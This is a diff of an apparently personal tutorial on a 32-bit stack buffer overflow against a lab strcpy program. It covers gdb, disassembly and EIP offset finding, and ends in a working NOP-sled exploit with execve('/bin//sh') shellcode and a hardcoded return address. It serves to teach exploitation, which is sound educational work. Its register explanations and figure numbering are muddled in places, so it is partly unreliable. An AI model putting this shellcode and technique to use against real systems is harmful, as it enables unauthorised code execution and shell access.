@@ -214,15 +214,15 @@ so now, let's look on that closely, we run gdb for debug that code using:
 ```
 >gdb ./vuln1
 ```
-After run that code we can run `list` command for see the lines of code, please note, if the code was compile without debugging flag, we aren't be able to see the full lines  of code, to run flag for debugging in `gcc` we can use `-g` on the compile process.
+After run that code we can run `list` command for see the lines of code, please note, if the code was compile without debugging flag, we aren't be able to see the full lines of code, to run flag for debugging in `gcc` we can use `-g` on the compile process.
 
 ![bo-004.png](/assets/images/bo-004.png)
-**Figure 4** List command on gdb.
+**Figure 5** List command on gdb.
 
 If we run `disassemble main` we will be able to see the assembly version of our code, these list may seen odd to a new student on that reverse engineer field, but it not so difficult to understand, so let's break it down column after column.
 
 ![bo-005.png](/assets/images/bo-005.png)
-**Figure 5** disassemble main.
+**Figure 6** disassemble main.
 
 On the first column we can see the odd number, `0x00001139`, this number represent the address location for the following line of code, next to it we can see `<+0>` which is indicates that the assembly instruction locate on 0 byte which mean that this is the start location of the code, you can see that this number goes up, on the third  line we can see 4, which represent that the assembly instruction is 4 bytes away from the previous instruction.
 
@@ -230,9 +230,9 @@ On the first column we can see the odd number, `0x00001139`, this number represe
 
 Now, let's break down the assembly code line by line for getting good understanding how it work and what the CPU have done on each.
 
-`push %ebp`: the %ebp is register that operate by the CPU, the operator on that case is push which push %ebp to the stack, since the %ebp is the base pointer register, by doing that operation the stack shpuld contain the RBP value.
+`push %ebp`: the %ebp is register that operate by the CPU, the operator on that case is push which push %ebp to the stack, since the %ebp is the base pointer register, by doing that operation the stack should contain the EBP value.
 
-`mov %esp, %ebp`: in that case the operator is mov, which use to move data from one location to another, the source register in our case is RSP which is the stack pointer, and the operation is moving the value on that RSP to the RBP which is the base pointer for the stack frame.
+`mov %esp, %ebp`: in that case the operator is mov, which use to move data from one location to another, the source register in our case is ESP which is the stack pointer, and the operation is moving the value on that ESP to the EBP which is the base pointer for the stack frame.
 
 `sub $0x210, %esp`: on that case the operator are subtracts one value from another. so the value $0x210 are subtracted from %esp, which mean the stack pointer is adjusted by subtracting 528 bytes (0x210 in hexadecimal).
 
@@ -240,17 +240,17 @@ Now, let's break down the assembly code line by line for getting good understand
 
 `mov %esi, -0x210(%ebp)`: move the %esi value to the %ebp, this is the second function argument is stored at an offset from the base pointer.
 
-`mov -0x210(%ebp), %eax`: again, move the %ebp value to the register RAX. Which mean the second function argument is loaded into %eax.
+`mov -0x210(%ebp), %eax`: again, move the %ebp value to the register EAX. Which mean the second function argument is loaded into %eax.
 
-`add $0x8, %eax`: on that line, the operation is to add one value to another, so the value $0x8 are added to RAX, which mean the value in %eax is incremented by 8.
+`add $0x8, %eax`: on that line, the operation is to add one value to another, so the value $0x8 are added to EAX, which mean the value in %eax is incremented by 8.
 
 `mov (%eax), %edx`: again, moe operator, the value pointed to by %eax is loaded into %edx.
 
 `lea -0x200(%ebp), %eax`: The lea are stand for Load Effective Address which computes the address and loads it into a register, so the effective address is calculated and loaded into %eax.
 
-`mov %edx, %esi`: move the value from RDX register to RSI which is used as an argument for the strcpy function.
+`mov %edx, %esi`: move the value from EDX register to ESI which is used as an argument for the strcpy function.
 
-`mov %eax, %edi`: move the holds the calculated address on RAX register to RDI which is used as an argument for the strcpy function.
+`mov %eax, %edi`: move the holds the calculated address on EAX register to EDI which is used as an argument for the strcpy function.
 
 `call 0x1030 <strcpy@plt>`: the operator here are performs a function call, you can see immediate value. It's the address of the strcpy function in the procedure linkage table (PLT).
 
@@ -265,7 +265,7 @@ Now, let's break down the assembly code line by line for getting good understand
 So now let's perform the attack, first we going the execute the code, we will see that it get some error.
 
 ![bo-006.png](/assets/images/bo-006.png)
-**Figure 6** Segmentation fault.
+**Figure 7** Segmentation fault.
 
 We getting this error, because the function should get at least one argument, so we must insert one argument, by doing so we can see that nothing goes back, we have no output as it should be.
 
@@ -273,8 +273,6 @@ We getting this error, because the function should get at least one argument, so
 **Figure 7** Nothing back.
 
 So now, back again to gdb, we will run command inside of that to execute the code with one argument that are far more longer then 500 characters, just remember, the code design in such way that the buffer can only contain 500 characters but there is no function ot operator that boundaries the argument1 value and there is no check what is the length of that value, and this is the case of making buffer overflow, so we going to use the command `run` with line of python code to make the argument 1 as input to that small program, we insert A char which is `\x41` on hexadecimal.
-
-Please note,on this post I display compiled code with base 32, if you want to follow my instruction you can do the same and compile the original code with the following command: `gcc -g -m32 -o ./output_code ./input_code.c`.
 
 The python code I used (which is python2 in my case) make 500 of A's and insert it as an argument into the running program which is our vuln1. then after running it we should get segmentation fault.
 
@@ -309,41 +307,72 @@ Program received signal SIGSEGV, Segmentation fault.
 ![bo-008.png](/assets/images/bo-008.png)
 **Figure 8** Segmentation fault after insert 500 of  A's.
 
-If we check the registers we will see that the eip register was fill up with `\x41`, so the system doesn't know how to operate with that value, so this is why we get that error, in fact on this case we overwrite the eip. we also can check the memory address to see the full vules that got in the stuck, the register esp is setup on the start of the stuck, so we can floow it and see all the characters we insert to the buffer. On our case ESP is point to the address `0xffffcd00`, so this is the start point we what to display the memory address table from the buffer.
+If we check the registers we will see that the eip register was fill up with `\x41`, so the system doesn't know how to operate with that value, so this is why we get that error, in fact on this case we overwrite the eip. we also can check the memory address to see the full vules that got in the stuck, the register esp is setup on the start of the stuck, so we can follow it and see all the characters we insert to the buffer.
+
+To see the registers location we can run `info registers`, this will display the registers and their values and also the location address for each register.
+
+![bo-012.png](/assets/images/bo-012.png)
+**Figure 9** Registers information.
+
+On our case ESP is point to the address `0xffffcd00`, so this is the start point we what to display the memory address table from the buffer. Since we know that the buffer size is 500, we will run the following that should dispay the first 500 bytes on that stuch, we can use the address like as follow:
 
 `x/500 0xffffcd00`
 
-Then if we scroll down, we will able to see the values of `\x41` we insert which cause the segmentation fault. On assembly the EBP (base pointer) are used to point to the next line of code that should be executed, every step that ebp value are change and the CPU execute each line base on the address location that are specified on that EBP.
+Or we can make it simple by run the following
+```
+x/500 $esp
+```
+
+Then if we scroll down, we will able to see the values of `\x41` we insert which cause the segmentation fault on the EIP. On assembly the ESP (stack pointer) are used to store the data that flow in and out the program. On our case the EIP was overwrite with `\x41` values, and we can see that list of `\x41` over the stack, so this may mean that we can store the shellcode on the stack and then create return address and overwrite the EIP with it.
+
+The return address to the top of the stack is `0xffffcd00`, since our `A` chars are not on the top, we need to figure out what is the return address we need to use.
+
+But first let's find the location of the EIP. We can change the inserted data in some way that we will be able to understand how much chars need to be inserted for overwrite the EIP. On our case we going to run the following:
+
+```
+run $(python2 -c "print 'A'*496 + 'B'*4")
+```
+
+On that case, we going to load 500 chars to the buffer (arg1), we load 496 chars of A's and more 4 chars of B's. Then we can see that by running that command and info registers after it, the EIP was filled up with B chars.
 
 ![bo-009.png](/assets/images/bo-009.png)
-**Figure 9** Addresses table.
+**Figure 9** Registers information after fault error.
 
-That is mean we want to overwrite that EBP so we have control on the base pointer to point back to our code, also called return address, if we have the return address that is the location of our code, this is the address we should insert to EBP.
+That is mean we want to overwrite that EIP so we have control on the instruction pointer to point back to our code location, also called return address, if we have the return address that is the location of our code, this is the address we should insert to EIP.
 
-So let's fill that code again with 508 characters of A's and check if that overwrite the EBP.
+So now we can filled the stack with our shellcode, since we know that the crash occurewhen the stack are filled with 500 chars and we also know that our code is 28 bytes long and the last 4 are used for EIP overwriting, we can came up with the following:
+```
+run $(python2 -c "print 'A'*468+<shellcode>+'B'*4")
+```
+
+This input should make the crash again, but we now should see our shellcode inserted to the stack.
+```
+(gdb) run $(python2 -c "print 'A'*468+'\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80'+'B'*4")
+```
+
+then run the following to view the esp values:
+```
+x/500x $esp
+```
 
 ![bo-010.png](/assets/images/bo-010.png)
-**Figure 10** Registers overwriting.
+**Figure 10** A's chars (\x41) on our stack.
 
-We can see that now the ESP is overwritten, so let's try to make that input bigger.
+You can see that the A's start between 0xffffcfd0 and 0xffffcfe0. If we want we can find the exact location of the start our A's with the following command.
+```
+x/4 0xffffcfd0
+```
 
-![bo-011.png](/assets/images/bo-011.png)
-**Figure 11** EBP is partly overwritten.
+![bo-011.png](/assets/images/bo-011.jpg)
+**Figure 11** Finding the exact location of our inserted data.
 
-Now we can see that EBP is only partly overwrite with our `\x41`, which mean for fill it up we need to use 512 characters on our input and that's it, we can control the EBP now.
+So, we can use the exact location of the starting code for our shell, meaning, that location address will be the return address we write over the EIP, in that way we can execute the code since the EIP is the pointer that responsible on the instruction way, so it point to some address that locate the code and execute it. But there is more option that we can do, on assembly there is NOP byte, which is `\x90` and it use as SLAD, becouse if the system get such byte `\x90` it just jump to the next byte, which mean that if there is chains of `\x90` it will go to the next, and next, and next, until it will be find some code for execution.
 
-![bo-012.png](/assets/images/bo-012.png)
-**Figure 12** Control the EBP.
+If we chose to use that way of execution, we can use the return address that we saw erlier `0xffffcfe0`, that return address not point to the first byte of our code, insead it point to several bytes next to if, so in our case, if we use that and instead of `A` we using NOP byte, it will go next and next until it will get to our shellcode.
 
-#include <stdio.h>
-#include <string.h>
-void secret(){
-  printf("You have accessed the secret function!!\n");
-}
-int main(int argc, char *argv[])
-{
-  char buf[512];
-  strcpy(buf, argv[1]);
-  printf("%s",buf);
-  return(0);
-}
+So the new line of code should look like the following:
+```
+(gdb) run $(python2 -c "print '\x90'*468+'\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80'+'\xe0\xfc\xff\xff'")
+````
+
+the last four bytes is our return address which we write doen way.
